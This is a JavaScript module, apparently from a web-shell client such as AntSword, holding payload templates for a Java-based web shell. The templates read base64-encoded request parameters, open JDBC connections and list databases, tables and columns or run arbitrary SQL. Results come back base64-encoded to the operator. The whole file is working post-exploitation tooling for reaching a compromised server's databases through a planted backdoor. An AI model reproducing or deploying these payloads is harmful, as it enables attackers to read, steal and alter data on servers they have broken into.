//
// 默认代码模板
//
// @params
// :encode  SHELL编码
// :conn    数据库连接字符串
// :sql     执行SQL语句
// :db      数据库名
// :table   表名

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  show_databases: {
    _: `
    function executeSQL(encode, conn, sql, columnsep, rowsep, needcoluname) {
      importPackage(Packages.java.sql);
      var ret = "";
      var x = conn.trim().replace("\\r\\n", "\\n").split("\\n");
      Class.forName(x[0].trim());
      var url = x[1] + "&characterEncoding=" + encode;
      var c = DriverManager.getConnection(url);
      var stmt = c.createStatement();
      var rs = stmt.executeQuery(sql);
      var rsmd = rs.getMetaData();
    
      if (needcoluname) {
        for (var i = 1; i <= rsmd.getColumnCount(); i++) {
          var columnName = rsmd.getColumnName(i);
          ret += columnName + columnsep;
        }
        ret += rowsep;
      }
    
      while (rs.next()) {
        for (var i = 1; i <= rsmd.getColumnCount(); i++) {
          var columnValue = rs.getString(i);
          ret += columnValue + columnsep;
        }
        ret += rowsep;
      }
      return ret;
    }
    
    function showDatabases(encode, conn) {
      var sql = "show databases";
      var columnsep = "\\t";
      var rowsep = "";
      return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }
    
    var z1 = decode(request.getParameter("${arg1}"));
    var z2 = decode(request.getParameter("${arg2}"));
    output.append(showDatabases(z1, z2));
    `.replace(/\n\s+/g, ""),
    [arg1]: "#{newbase64::encode}",
    [arg2]: "#{newbase64::conn}",
  },
  show_tables: {
    _: `
    function executeSQL(encode, conn, sql, columnsep, rowsep, needcoluname) {
      importPackage(Packages.java.sql);
      var ret = "";
      var x = conn.trim().replace("\\r\\n", "\\n").split("\\n");
      Class.forName(x[0].trim());
      var url = x[1] + "&characterEncoding=" + encode;
      var c = DriverManager.getConnection(url);
      var stmt = c.createStatement();
      var rs = stmt.executeQuery(sql);
      var rsmd = rs.getMetaData();
    
      if (needcoluname) {
        for (var i = 1; i <= rsmd.getColumnCount(); i++) {
          var columnName = rsmd.getColumnName(i);
          ret += columnName + columnsep;
        }
        ret += rowsep;
      }
    
      while (rs.next()) {
        for (var i = 1; i <= rsmd.getColumnCount(); i++) {
          var columnValue = rs.getString(i);
          ret += columnValue + columnsep;
        }
        ret += rowsep;
      }
      return ret;
    }
    
    function showTables(encode, conn, dbname) {
      var sql = "show tables from " + dbname;
      var columnsep = "\\t";
      var rowsep = "";
      return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }
    
    var z1 = decode(request.getParameter("${arg1}"));
    var z2 = decode(request.getParameter("${arg2}"));
    var z3 = decode(request.getParameter("${arg3}"));
    output.append(showTables(z1, z2, z3));
    `.replace(/\n\s+/g, ""),
    [arg1]: "#{newbase64::encode}",
    [arg2]: "#{newbase64::conn}",
    [arg3]: "#{newbase64::db}",
  },
  show_columns: {
    _: `
    function executeSQL(encode, conn, sql, columnsep, rowsep, needcoluname) {
      importPackage(Packages.java.sql);
      var ret = "";
      var x = conn.trim().replace("\\r\\n", "\\n").split("\\n");
      Class.forName(x[0].trim());
      var url = x[1] + "&characterEncoding=" + encode;
      var c = DriverManager.getConnection(url);
      var stmt = c.createStatement();
      var rs = stmt.executeQuery(sql);
      var rsmd = rs.getMetaData();
    
      if (needcoluname) {
        for (var i = 1; i <= rsmd.getColumnCount(); i++) {
          var columnName = rsmd.getColumnName(i);
          ret += columnName + columnsep;
        }
        ret += rowsep;
      }
    
      while (rs.next()) {
        for (var i = 1; i <= rsmd.getColumnCount(); i++) {
          var columnValue = rs.getString(i);
          ret += columnValue + columnsep;
        }
        ret += rowsep;
      }
      return ret;
    }
    
    function showColumns(encode, conn, dbname, table) {
      var columnsep = "\\t";
      var rowsep = "";
      var sql = "select * from " + dbname + "." + table + " limit 0,0";
      return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }
    
    var z1 = decode(request.getParameter("${arg1}"));
    var z2 = decode(request.getParameter("${arg2}"));
    var z3 = decode(request.getParameter("${arg3}"));
    var z4 = decode(request.getParameter("${arg4}"));
    output.append(showColumns(z1, z2, z3, z4));
    `.replace(/\n\s+/g, ""),
    [arg1]: "#{newbase64::encode}",
    [arg2]: "#{newbase64::conn}",
    [arg3]: "#{newbase64::db}",
    [arg4]: "#{newbase64::table}",
  },
  query: {
    _: `
    function Base64Encode(str) {
      importPackage(Packages.sun.misc);
      importPackage(Packages.java.util);
      var ret = "";
      try {
        ret = new Base64().getEncoder().encodeToString(str.getBytes());
      } catch (e) {
        ret = new BASE64Encoder().encode(str.getBytes());
      }
      ret = ret.replaceAll("\\r|\\n", "");
      return ret;
    }
    function executeSQL(encode, conn, sql, columnsep, rowsep, needcoluname) {
      importPackage(Packages.java.sql);
      var ret = "";
      var x = conn.trim().replace("\\r\\n", "\\n").split("\\n");
      Class.forName(x[0].trim());
      var url = x[1] + "&characterEncoding=" + encode;
      var c = DriverManager.getConnection(url);
      var stmt = c.createStatement();
      var isRS = stmt.execute(sql);
      if (isRS) {
        var rs = stmt.getResultSet();
        var rsmd = rs.getMetaData();
    
        if (needcoluname) {
          for (var i = 1; i <= rsmd.getColumnCount(); i++) {
            var columnName = rsmd.getColumnName(i);
            ret += columnName + columnsep;
          }
          ret += rowsep;
        }
    
        while (rs.next()) {
          for (var i = 1; i <= rsmd.getColumnCount(); i++) {
            var columnValue = rs.getString(i);
            ret += Base64Encode(columnValue) + columnsep;
          }
          ret += rowsep;
        }
      } else {
        ret += "Result" + columnsep + rowsep;
        var rowCount = stmt.getUpdateCount();
        if (rowCount > 0) {
          ret += Base64Encode("Rows changed = " + rowCount) + columnsep + rowsep;
        } else if (rowCount == 0) {
          ret +=
            Base64Encode("No rows changed or statement was DDL command") +
            columnsep +
            rowsep;
        } else {
          ret += Base64Encode("False") + columnsep + rowsep;
        }
      }
      return ret;
    }
    function query(encode, conn, sql) {
      var columnsep = "\\t|\\t";
      var rowsep = "\\r\\n";
      return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }
    var z1 = decode(request.getParameter("${arg1}"));
    var z2 = decode(request.getParameter("${arg2}"));
    var z3 = decode(request.getParameter("${arg3}"));
    output.append(query(z1, z2, z3));
    `.replace(/\n\s+/g, ""),
    [arg1]: "#{newbase64::encode}",
    [arg2]: "#{newbase64::conn}",
    [arg3]: "#{newbase64::sql}",
  },
});
